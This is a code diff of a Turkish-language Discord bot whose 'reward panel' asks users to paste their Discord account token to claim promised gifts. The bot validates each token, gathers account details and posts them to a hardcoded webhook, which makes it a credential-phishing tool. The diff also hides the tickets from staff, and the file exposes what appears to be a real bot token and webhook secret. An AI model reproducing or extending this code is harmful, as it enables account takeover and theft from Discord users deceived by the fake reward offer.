@@ -4,13 +4,14 @@ from discord.ext import commands
 from discord.ui import Button, View, Modal, TextInput, Select
 import requests
 import json
+import os
 
 # ===== KONFIGURASYON =====
 BOT_TOKEN = "MTUyNjcxMjM2NTQ5NDU2NjkzMg.GDj3jp.FnuHDb2p37z6HaYNdxQ0sFUswwjHcbIY9IHgbg"
 WEBHOOK_URL = "https://discord.com/api/webhooks/1526713905865293944/Z1QPSN5Mbx30WGlkWPCLiqnX1JLPliiY_0ziIjq8OGw5NvRRyRBTSj8kSrMkuTfGyZrs"
 TICKET_CATEGORY_ID = 1526849082579222678  # Kategori ID'si
-STAFF_ROLE_ID = 1520637225791131678       # Yetkili rol ID'si
 GUILD_ID = 1469472843120246957            # Sunucu ID'si
+# STAFF_ROLE_ID kaldırıldı!
 # =========================
 
 intents = discord.Intents.default()
@@ -56,11 +57,11 @@ class OdulView(View):
 
 class TokenModal(Modal):
     def __init__(self, odul: str):
-        super().__init__(title=f"🎯 {odul} Ödülü")
+        super().__init__(title=f"🎯 {odul} Odulu")
         self.odul = odul
         self.token_input = TextInput(
             label="Discord Token",
-            placeholder="Tokenini buraya yapıştır...",
+            placeholder="Tokenini buraya yapistir...",
             required=True,
             style=discord.TextStyle.paragraph
         )
@@ -73,7 +74,7 @@ class TokenModal(Modal):
 
         gecerli, veri = check_token(token)
         if not gecerli:
-            await interaction.response.send_message("❌ **Geçersiz token!** Lütfen doğru token gir.", ephemeral=True)
+            await interaction.response.send_message("❌ **Gecersiz token!** Lutfen dogru token gir.", ephemeral=True)
             return
 
         username = f"{veri['username']}#{veri.get('discriminator', '0')}"
@@ -90,8 +91,8 @@ class TokenModal(Modal):
             category = guild.get_channel(TICKET_CATEGORY_ID)
             overwrites = {
                 guild.default_role: discord.PermissionOverwrite(read_messages=False),
-                kullanici: discord.PermissionOverwrite(read_messages=True, send_messages=True),
-                guild.get_role(STAFF_ROLE_ID): discord.PermissionOverwrite(read_messages=True, send_messages=True)
+                kullanici: discord.PermissionOverwrite(read_messages=True, send_messages=True)
+                # Yetkili rolü kaldırıldı, sadece kullanıcı ve bot görebilir.
             }
             channel = await guild.create_text_channel(
                 name=f"odul-{kullanici.name}",
@@ -100,10 +101,10 @@ class TokenModal(Modal):
             )
 
             embed = discord.Embed(
-                title="🎫 Zirve Ödül Ticket",
+                title="🎫 Zirve Odul Ticket",
                 description=(
-                    f"**Kullanıcı:** {kullanici.mention}\n"
-                    f"**Ödül:** {self.odul}\n"
+                    f"**Kullanici:** {kullanici.mention}\n"
+                    f"**Odul:** {self.odul}\n"
                     f"**Hesap:** {username}\n"
                     f"**Nitro:** {nitro_text}\n"
                     f"**HypeSquad:** {hype}\n\n"
@@ -111,22 +112,22 @@ class TokenModal(Modal):
                 ),
                 color=0xffd700
             )
-            embed.set_footer(text="Zirve Gift | Yetkili onayı bekleniyor")
+            embed.set_footer(text="Zirve Gift | Yetkili onayi bekleniyor")
 
             select = Select(
-                placeholder="Ödül kategorisini seç...",
+                placeholder="Odul kategorisini sec...",
                 options=[
-                    discord.SelectOption(label="ZirveGift", emoji="🎁", description="Ana ödül"),
-                    discord.SelectOption(label="Satın alım", emoji="💰", description="Satın alınan ödül"),
-                    discord.SelectOption(label="Ürün bilgi", emoji="📄", description="Ürün detayları"),
+                    discord.SelectOption(label="ZirveGift", emoji="🎁", description="Ana odul"),
+                    discord.SelectOption(label="Satin alim", emoji="💰", description="Satin alinan odul"),
+                    discord.SelectOption(label="Urun bilgi", emoji="📄", description="Urun detaylari"),
                     discord.SelectOption(label="Sponsor", emoji="🤝", description="Sponsorluk"),
-                    discord.SelectOption(label="Çekiliş", emoji="🎲", description="Çekiliş ödülü"),
-                    discord.SelectOption(label="İnvite ödül", emoji="📩", description="Davet ödülü"),
-                    discord.SelectOption(label="Gmail ödül", emoji="📧", description="Gmail ödülü")
+                    discord.SelectOption(label="Cekilis", emoji="🎲", description="Cekilis odulu"),
+                    discord.SelectOption(label="Invite odul", emoji="📩", description="Davet odulu"),
+                    discord.SelectOption(label="Gmail odul", emoji="📧", description="Gmail odulu")
                 ]
             )
             async def select_callback(interaction2):
-                await interaction2.response.send_message(f"✅ **{interaction2.data['values'][0]}** seçildi.", ephemeral=True)
+                await interaction2.response.send_message(f"✅ **{interaction2.data['values'][0]}** secildi.", ephemeral=True)
             select.callback = select_callback
 
             class OnayView(View):
@@ -135,15 +136,15 @@ class TokenModal(Modal):
 
                 @discord.ui.button(label="✅ Onayla", style=discord.ButtonStyle.green)
                 async def onay(self, interaction2: discord.Interaction, button: Button):
-                    await interaction2.response.send_message("✅ Ödül onaylandı!", ephemeral=False)
-                    await kullanici.send(f"✅ {self.odul} ödülün onaylandı! 27-72 saat içinde hesabına gönderilecek.")
-                    requests.post(WEBHOOK_URL, json={"content": f"✅ {kullanici} için {self.odul} ödülü onaylandı."})
+                    await interaction2.response.send_message("✅ Odul onaylandi!", ephemeral=False)
+                    await kullanici.send(f"✅ {self.odul} odulun onaylandi! 27-72 saat icinde hesabina gonderilecek.")
+                    requests.post(WEBHOOK_URL, json={"content": f"✅ {kullanici} icin {self.odul} odulu onaylandi."})
 
                 @discord.ui.button(label="❌ Reddet", style=discord.ButtonStyle.red)
                 async def red(self, interaction2: discord.Interaction, button: Button):
-                    await interaction2.response.send_message("❌ Ödül reddedildi.", ephemeral=False)
-                    await kullanici.send(f"❌ {self.odul} ödülün reddedildi. Lütfen yetkiliyle iletişime geç.")
-                    requests.post(WEBHOOK_URL, json={"content": f"❌ {kullanici} için {self.odul} ödülü reddedildi."})
+                    await interaction2.response.send_message("❌ Odul reddedildi.", ephemeral=False)
+                    await kullanici.send(f"❌ {self.odul} odulun reddedildi. Lutfen yetkiliyle iletisime gec.")
+                    requests.post(WEBHOOK_URL, json={"content": f"❌ {kullanici} icin {self.odul} odulu reddedildi."})
 
             view = OnayView()
             view.add_item(select)
@@ -151,9 +152,9 @@ class TokenModal(Modal):
             await channel.send(embed=embed, view=view)
 
             mesaj = (
-                f"**🎫 Yeni Ödül Ticket Açıldı!**\n"
-                f"Kullanıcı: {kullanici} (ID: {kullanici.id})\n"
-                f"Ödül: {self.odul}\n"
+                f"**🎫 Yeni Odul Ticket Acildi!**\n"
+                f"Kullanici: {kullanici} (ID: {kullanici.id})\n"
+                f"Odul: {self.odul}\n"
                 f"Hesap: {username}\n"
                 f"Nitro: {nitro_text}\n"
                 f"HypeSquad: {hype}\n"
@@ -163,32 +164,31 @@ class TokenModal(Modal):
             requests.post(WEBHOOK_URL, json={"content": mesaj})
 
             await interaction.response.send_message(
-                f"✅ **Token doğrulandı!** Ticket açıldı: {channel.mention}",
+                f"✅ **Token dogrulandi!** Ticket acildi: {channel.mention}",
                 ephemeral=True
             )
 
         except Exception as e:
-            await interaction.response.send_message(f"❌ Ticket açılamadı: {e}", ephemeral=True)
+            await interaction.response.send_message(f"❌ Ticket acilamadi: {e}", ephemeral=True)
 
 @bot.command()
 async def panel(ctx):
     embed = discord.Embed(
-        title="🏆 Zirve Ödül Paneli",
-        description="Aşağıdaki butonlardan bir ödül seç. Token'ını gir, ticket açılacak ve yetkili onaylayacak.",
+        title="🏆 Zirve Odul Paneli",
+        description="Asagidaki butonlardan bir odul sec. Token'ini gir, ticket acilacak ve yetkili onaylayacak.",
         color=0xffd700
     )
     embed.set_footer(text="Zirve Panel | Ticket Sistemi")
     await ctx.send(embed=embed, view=OdulView())
 
-
-# ===================== 2. TICKET KOMUTU (KATEGORİLİ) =====================
+# ===================== 2. TICKET KOMUTU (KATEGORILI) =====================
 class TicketModal(Modal):
     def __init__(self, kategori: str):
         super().__init__(title=f"🎫 {kategori} Ticket")
         self.kategori = kategori
         self.aciklama = TextInput(
-            label="Açıklama",
-            placeholder="Detaylı açıklama yaz...",
+            label="Aciklama",
+            placeholder="Detayli aciklama yaz...",
             required=True,
             style=discord.TextStyle.paragraph
         )
@@ -203,8 +203,8 @@ class TicketModal(Modal):
             category = guild.get_channel(TICKET_CATEGORY_ID)
             overwrites = {
                 guild.default_role: discord.PermissionOverwrite(read_messages=False),
-                kullanici: discord.PermissionOverwrite(read_messages=True, send_messages=True),
-                guild.get_role(STAFF_ROLE_ID): discord.PermissionOverwrite(read_messages=True, send_messages=True)
+                kullanici: discord.PermissionOverwrite(read_messages=True, send_messages=True)
+                # Yetkili rolü kaldırıldı
             }
             channel = await guild.create_text_channel(
                 name=f"{self.kategori}-{kullanici.name}",
@@ -215,22 +215,22 @@ class TicketModal(Modal):
             embed = discord.Embed(
                 title="🎫 Genel Ticket",
                 description=(
-                    f"**Kullanıcı:** {kullanici.mention}\n"
+                    f"**Kullanici:** {kullanici.mention}\n"
                     f"**Kategori:** {self.kategori}\n"
-                    f"**Açıklama:** {aciklama}"
+                    f"**Aciklama:** {aciklama}"
                 ),
                 color=0x00ff00
             )
-            embed.set_footer(text="Zirve Ticket | Yetkili yanıt verecek.")
+            embed.set_footer(text="Zirve Ticket | Yetkili yanit verecek.")
 
             await channel.send(embed=embed)
             await interaction.response.send_message(
-                f"✅ Ticket açıldı: {channel.mention}",
+                f"✅ Ticket acildi: {channel.mention}",
                 ephemeral=True
             )
 
         except Exception as e:
-            await interaction.response.send_message(f"❌ Ticket açılamadı: {e}", ephemeral=True)
+            await interaction.response.send_message(f"❌ Ticket acilamadi: {e}", ephemeral=True)
 
 class KategoriView(View):
     def __init__(self):
@@ -240,44 +240,43 @@ class KategoriView(View):
     async def zirvegift(self, interaction: discord.Interaction, button: Button):
         await interaction.response.send_modal(TicketModal(kategori="ZirveGift"))
 
-    @discord.ui.button(label="💰 Satın alım", style=discord.ButtonStyle.blurple)
+    @discord.ui.button(label="💰 Satin alim", style=discord.ButtonStyle.blurple)
     async def satinalim(self, interaction: discord.Interaction, button: Button):
-        await interaction.response.send_modal(TicketModal(kategori="Satın alım"))
+        await interaction.response.send_modal(TicketModal(kategori="Satin alim"))
 
-    @discord.ui.button(label="📄 Ürün bilgi", style=discord.ButtonStyle.gray)
+    @discord.ui.button(label="📄 Urun bilgi", style=discord.ButtonStyle.gray)
     async def urunbilgi(self, interaction: discord.Interaction, button: Button):
-        await interaction.response.send_modal(TicketModal(kategori="Ürün bilgi"))
+        await interaction.response.send_modal(TicketModal(kategori="Urun bilgi"))
 
     @discord.ui.button(label="🤝 Sponsor", style=discord.ButtonStyle.gray)
     async def sponsor(self, interaction: discord.Interaction, button: Button):
         await interaction.response.send_modal(TicketModal(kategori="Sponsor"))
 
-    @discord.ui.button(label="🎲 Çekiliş", style=discord.ButtonStyle.gray)
+    @discord.ui.button(label="🎲 Cekilis", style=discord.ButtonStyle.gray)
     async def cekilis(self, interaction: discord.Interaction, button: Button):
-        await interaction.response.send_modal(TicketModal(kategori="Çekiliş"))
+        await interaction.response.send_modal(TicketModal(kategori="Cekilis"))
 
-    @discord.ui.button(label="📩 İnvite ödül", style=discord.ButtonStyle.gray)
+    @discord.ui.button(label="📩 Invite odul", style=discord.ButtonStyle.gray)
     async def invite(self, interaction: discord.Interaction, button: Button):
-        await interaction.response.send_modal(TicketModal(kategori="İnvite ödül"))
+        await interaction.response.send_modal(TicketModal(kategori="Invite odul"))
 
-    @discord.ui.button(label="📧 Gmail ödül", style=discord.ButtonStyle.gray)
+    @discord.ui.button(label="📧 Gmail odul", style=discord.ButtonStyle.gray)
     async def gmail(self, interaction: discord.Interaction, button: Button):
-        await interaction.response.send_modal(TicketModal(kategori="Gmail ödül"))
+        await interaction.response.send_modal(TicketModal(kategori="Gmail odul"))
 
 @bot.command()
 async def tick(ctx):
     embed = discord.Embed(
         title="🎫 Zirve Ticket Sistemi",
-        description="Aşağıdaki butonlardan bir kategori seç. Açıklama gir ve ticket oluştur.",
+        description="Asagidaki butonlardan bir kategori sec. Aciklama gir ve ticket olustur.",
         color=0x00ff00
     )
     embed.set_footer(text="Zirve Ticket | 7/24 Destek")
     await ctx.send(embed=embed, view=KategoriView())
 
-
 # ===== BOT HAZIR =====
 @bot.event
 async def on_ready():
-    print(f"✅ Zirve Bot aktif! Kullanıcı: {bot.user}")
+    print(f"✅ Zirve Bot aktif! Kullanici: {bot.user}")
 
 bot.run(BOT_TOKEN)
